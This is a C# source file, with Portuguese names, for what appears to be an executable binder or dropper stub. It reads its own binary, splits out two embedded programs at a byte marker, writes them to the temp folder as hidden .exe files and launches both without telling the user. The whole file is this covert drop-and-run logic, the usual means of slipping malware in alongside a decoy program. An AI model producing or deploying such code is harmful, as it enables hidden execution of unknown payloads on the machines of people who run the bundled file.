using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace ArquivoUnido
{
    class Program
    {
        static byte[] arquivoComposto;
        static byte[] arquivo1;
        static byte[] arquivo2;

        static bool preencherArquivo1 = false;
        static bool preencherArquivo2 = false;
        static void Main(string[] args)
        {
            arquivoComposto = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.ModuleName);

            if (arquivoComposto.Length == 2)
            { 
                File.WriteAllBytes("arqBase.arq", arquivoComposto); 
            }
         
            long y = 0;
            long z = 0;
            for (long x=0; x<arquivoComposto.Length; x++)
            {
                if (VerificarFimDeArquivo(x))
                {
                    x += 6;
                    if (preencherArquivo1 && !preencherArquivo2)
                    {
                        preencherArquivo1 = false;
                        preencherArquivo2 = true;
                        arquivo2 = new byte[arquivoComposto.Length - x];
                    }

                    if (!preencherArquivo1 && !preencherArquivo2)
                    {
                        preencherArquivo1 = true;
                        arquivo1 = new byte[arquivoComposto.Length - x];
                    }
                }

                if(preencherArquivo1)
                {
                    arquivo1[y] = arquivoComposto[x];
                    y++;
                }
                else
                {
                    if(preencherArquivo2)
                    {
                        arquivo2[z] = arquivoComposto[x];
                        z++;
                    }
                }
            }

            File.WriteAllBytes(Path.GetTempPath()+  "arq1.exe", arquivo1);
            File.SetAttributes(Path.GetTempPath() + "arq1.exe", FileAttributes.Hidden);
            File.WriteAllBytes(Path.GetTempPath() + "arq2.exe", arquivo2);
            File.SetAttributes(Path.GetTempPath() + "arq2.exe", FileAttributes.Hidden);


            Process.Start(Path.GetTempPath() + "arq1.exe");
            Process.Start(Path.GetTempPath() + "arq2.exe");
        }

        public static bool VerificarFimDeArquivo(long x)
        {
            if (arquivoComposto[x] == 170 && arquivoComposto[x + 1] == 187 && arquivoComposto[x + 2] == 204 && arquivoComposto[x + 3] == 221 && arquivoComposto[x + 4] == 238 && arquivoComposto[x + 5] == 255)
            {
                return true;
            }

            return false;
        }
    }
}
